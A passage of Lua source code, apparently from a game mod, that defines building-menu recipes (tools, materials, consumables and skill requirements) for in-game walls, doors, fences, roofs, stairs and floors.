        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.BigMetalBarGlassWallRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.MetalBar',
                Amount = metalBarsCount
            },
            {
                Material = 'Base.Screws',
                Amount = screwsCount
            },
            {
                Material = "Base.GlassPane",
                Amount = BuildingMenu.round(glassPaneCount*1.5)
            },
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 5,
                Xp = BuildingMenu.round(5*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.BigMetalBarWallRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.MetalBar',
                Amount = metalBarsCount
            },
            {
                Material = 'Base.Screws',
                Amount = screwsCount
            },
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 5,
                Xp = BuildingMenu.round(5*metalweldingXpPerLevel)
            }
        }
    }


    BuildingMenu.SmallMetalBarWallRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*0.5)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            },
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 4
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(4)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            }
        }
    }


    BuildingMenu.BigMetalWallRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = sheetMetalCountForWalls
            },
            {
                Material = 'Base.MetalBar',
                Amount = metalBarsCount
            },
            {
                Material = 'Base.Screws',
                Amount = screwsCount
            },
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            }
        }
    }


    BuildingMenu.SmallMetalWallRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForWalls*0.5)
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*0.5)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            },
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 4
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(4)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.ScrapRoofTileRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask",
            "Saw"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = sheetMetalCountForRoofingAndFloors
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*0.5)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            },
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 2,
                Xp = BuildingMenu.round(2*metalweldingXpPerLevel)
            },
        }
    }

    BuildingMenu.BigScrapWallRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask",
            "Hammer",
            "Saw"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigWallWoodCount*0.75)
            },
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForWalls*0.5)
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*0.5)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(bigWallNailsCount*0.75)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 4
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(4)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            },
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.SmallScrapWallRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask",
            "Hammer",
            "Saw"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallWallWoodCount*0.75)
            },
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForWalls*0.25)
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*0.25)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallWallNailsCount*0.75)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 2
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(2)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 2,
                Xp = BuildingMenu.round(2*metalweldingXpPerLevel)
            },
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.BigScrapHighFenceRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask",
            "Hammer",
            "Saw"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigWallWoodCount*1.5)
            },
            {
                Material = 'Base.SheetMetal',
                Amount = sheetMetalCountForWalls
            },
            {
                Material = 'Base.MetalBar',
                Amount = metalBarsCount
            },
            {
                Material = 'Base.Screws',
                Amount = screwsCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 6
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(6)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 7,
                Xp = BuildingMenu.round(7*metalweldingXpPerLevel)
            },
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(bigObjectsCarpentrySkill*1.75),
                Xp = BuildingMenu.round(1.75*bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.SmallScrapLowFenceRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask",
            "Hammer",
            "Saw"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallWallWoodCount*1.25)
            },
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForWalls*0.5)
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*0.5)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.75)
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 3
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(3)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 6,
                Xp = BuildingMenu.round(6*metalweldingXpPerLevel)
            },
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.RoofTileRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.75)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.75)
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GlassRoofTileRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.5)
            },
            {
                Material = "Base.GlassPane",
                Amount = BuildingMenu.round(glassPaneCount*1.5)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.75)
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WoodenDoorRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallObjectsWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallObjectsNailsCount
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            },
            {
                Material = "Base.Doorknob",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.WoodenSingleGlassDoorRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallObjectsWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallObjectsWoodCount
            },
            {
                Material = "Base.GlassPane",
                Amount = BuildingMenu.round(glassPaneCount*0.5)
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            },
            {
                Material = "Base.Doorknob",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WoodenDoubleGlassDoorRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallObjectsWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallObjectsWoodCount
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            },
            {
                Material = "Base.Doorknob",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.LowWoodenDoorRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.75)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.75)
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            },
            {
                Material = "Base.Doorknob",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.ScrapDoor1Recipe = {
        neededTools = {
            "Hammer",
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.75)
            },
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForDoors*0.75) 
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*0.5)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.75)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            },
            {
                Material = "Base.Doorknob",
                Amount = 1
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            },
            {
                Skill = "MetalWelding",
                Level = 2,
                Xp = BuildingMenu.round(2*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.ScrapDoor2Recipe = {
        neededTools = {
            "Hammer",
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallObjectsWoodCount
            },
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForDoors*1.25)
            },
            {
                Material = 'Base.MetalBar',
                Amount = metalBarsCount
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.75)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            },
            {
                Material = "Base.Doorknob",
                Amount = 1
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            },
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.MetalDoorRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = sheetMetalCountForDoors
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*0.75)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.75)
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            },
            {
                Material = "Base.Doorknob",
                Amount = 1
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.MetalSingleGlassDoorRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = sheetMetalCountForDoors
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*0.75)
            },
            {
                Material = 'Base.GlassPane',
                Amount = BuildingMenu.round(glassPaneCount*0.5)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.75)
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            },
            {
                Material = "Base.Doorknob",
                Amount = 1
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 5,
                Xp = BuildingMenu.round(5*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.JailDoorRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForDoors*0.5)
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*2)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*1.5)
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            },
            {
                Material = "Base.Doorknob",
                Amount = 1
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 6,
                Xp = BuildingMenu.round(6*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.GarageDoorRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForDoors*2)
            },
            {
                Material = 'Base.MetalBar',
                Amount = metalBarsCount
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*2)
            },
            {
                Material = "Base.Hinge",
                Amount = 4
            },
            {
                Material = "Base.Doorknob",
                Amount = 1
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 10
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(10)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 6,
                Xp = BuildingMenu.round(6*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.WoodenDoorTrimRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.5)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.5)
            },
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.5),
                Xp = BuildingMenu.round(1*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WoodenDoorFrameRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.75)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.5)
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.75),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WallDecorationRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.5)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.5)
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.5),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WindowRecipe = {
        neededTools = {
            "Hammer",
            "Screwdriver"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigWallWoodCount*0.75)
            },
            {
                Material = "Base.Screws",
                Amount = 5
            },
            {
                Material = "Base.GlassPane",
                Amount = glassPaneCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.HighWireFenceRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SmallSheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForWalls*0.75)
            },
            {
                Material = "Base.ScrapMetal",
                Amount = 20
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Wire",
                Amount = 5
            },
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 5,
                Xp = BuildingMenu.round(5*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.HighWireFencePostRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SmallSheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForWalls*0.5)
            },
            {
                Material = "Base.ScrapMetal",
                Amount = 10
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Wire",
                Amount = 2
            },
            {
                Consumable = 'Base.BlowTorch',
                Amount = 3
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(3)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 5,
                Xp = BuildingMenu.round(5*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.HighConcreteWireFenceRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SmallSheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForWalls*0.75)
            },
            {
                Material = "Base.ScrapMetal",
                Amount = 20
            }
        },
        useConsumable = {
            {
                Consumable = "Base.BucketConcreteFull",
                Amount = 1
            },
            {
                Consumable = "Base.Wire",
                Amount = 5
            },
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 5,
                Xp = BuildingMenu.round(5*metalweldingXpPerLevel)
            }
        }
    }


    BuildingMenu.HighConcreteWireFencePostRecipe = {
        neededTools = {
            "BlowTorch",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SmallSheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForWalls*0.5)
            },
            {
                Material = "Base.ScrapMetal",
                Amount = 10
            }
        },
        useConsumable = {
            {
                Consumable = "Base.BucketConcreteFull",
                Amount = 1
            },
            {
                Consumable = "Base.Wire",
                Amount = 2
            },
            {
                Consumable = 'Base.BlowTorch',
                Amount = 3
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(3)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 5,
                Xp = BuildingMenu.round(5*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.HighConcreteFenceRecipe = {
        neededTools = {
            "Hammer",
            "Shovel"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.BucketConcreteFull",
                Amount = 2
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.HighConcreteFencePostRecipe = {
        neededTools = {
            "Hammer",
            "Shovel"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        useConsumable = {
            {
                Consumable = "Base.BucketConcreteFull",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(bigObjectsCarpentrySkill*0.75),
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.HighWoodenFenceRecipe = {
        neededTools = {
            "Hammer",
            "Shovel"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigWallWoodCount*1.5)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(bigWallNailsCount*1.5)
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Dirtbag",
                Amount = 1
            },
            {
                Consumable = "Base.BucketWaterFull",
                Amount = 10
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = bigObjectsCarpentrySkill,
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.HighWoodenFencePostRecipe = {
        neededTools = {
            "Hammer",
            "Shovel"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallWallWoodCount*1.25)
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallWallNailsCount*1.25)
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Dirtbag",
                Amount = 1
            },
            {
                Consumable = "Base.BucketWaterFull",
                Amount = 10
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(bigObjectsCarpentrySkill*0.75),
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.WoodenFenceRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = smallWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = smallWallNailsCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.75),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.MetalFencePostRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SmallSheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForWalls*0.5)
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*0.5)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            },
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 3
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(3)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.HescoBarrierRecipe = {
        neededTools = {
            "Hammer",
            "Shovel"
        },
        neededMaterials = {
            {
                Material = "Base.Sheet",
                Amount = 4
            },
            {
                Material = "Base.Dirtbag",
                Amount = 2
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Wire",
                Amount = 10
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.5),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.TwoSpriteFloorRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.5),
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.25),
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.WoodenStairsRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(bigObjectsWoodCount*2.25),
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(bigObjectsNailsCount*1.5),
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(bigObjectsCarpentrySkill*1.25),
                Xp = BuildingMenu.round(bigObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.MetalStairsRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = 10
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*2)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*1.5)
            },
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 10
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(10)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 6,
                Xp = BuildingMenu.round(6*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.MetalFloorRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = sheetMetalCountForRoofingAndFloors
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            },
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 2
            },
            {
